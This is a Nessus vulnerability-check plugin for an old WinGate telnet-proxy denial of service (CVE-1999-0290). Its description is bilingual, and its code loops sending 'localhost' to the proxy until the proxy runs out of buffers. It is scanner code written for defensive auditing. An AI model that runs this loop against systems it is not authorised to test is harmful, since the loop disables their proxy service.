#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10310);
script_cve_id("CVE-1999-0290");
 script_version ("$Revision: 1.14 $");

 
 name["english"] = "Wingate denial of service";
 name["francais"] = "Déni de service WinGate";
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "The remote Wingate service
can be forced to connect to itself continually
until it runs out of buffers. When this happens,
the telnet proxy service will be disabled.

An attacker may block your telnet proxy this
way, thus preventing your system from working
properly if you need telnet. An attacker may also
use this flaw to force your systems to use another
proxy which may be under the attacker's control.


Solution : configure WinGate so that
only authorized users can use it.

Risk factor : Low";


 desc["francais"] = "On peut forcer le
wingate distant à se connecter à lui-meme 
un grand nombre de fois, jusqu'au moment
où il manque de buffers. A ce moment,
ce service sera desactivé.

Un pirate peut donc bloquer votre
proxy telnet, vous empechant ainsi
de travailler convenablement si vous
avez besoin de telnet, ou peut 
utiliser ce problème pour vous forcer
à utiliser un autre proxy telnet qui
est peut etre sous son controle.


Solution : configurez WinGate
de telle sorte que seuls les utilisateurs
authentifiés puissent s'en servir.

Facteur de risque: Faible";


 script_description(english:desc["english"],
 		    francais:desc["francais"]);
 
 summary["english"] = "Determines if Wingate is vulnerable to a buffer attack"; 
 summary["francais"] = "Détermine si wingate peut etre à bout de buffers";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 
 family["english"] = "Denial of Service"; 
 family["francais"] = "Déni de service";
 
 script_family(english:family["english"],
 	       francais:family["francais"]);
 script_dependencie("find_service.nes", "wingate.nasl");
 script_require_keys("wingate/enabled");
 script_require_ports("Services/telnet", 23);
 exit(0);
}

#
# The script code starts here
#

wingate = get_kb_item("wingate/enabled");
if(!wingate)exit(0);
port = get_kb_item("Services/telnet");
if(!port)port = 23;

if(get_port_state(port))soc = open_sock_tcp(port);
if(soc)
{
flaw = 0;
for(i=0;i<5000;i=i+1)
{
 buffer = recv(socket:soc, length:8);
 b = string("localhost\r\n");
 send(socket:soc, data:b);
 r = recv(socket:soc, length:1024);
 for(i=0;i<11;i=i+1)d = recv(socket:soc, length:1);
 r = recv(socket:soc, length:100);
 r = tolower(r);
 if(("buffer" >< r)){
	i = 5001;
	security_warning(port);
	}
  }
close(soc);
}
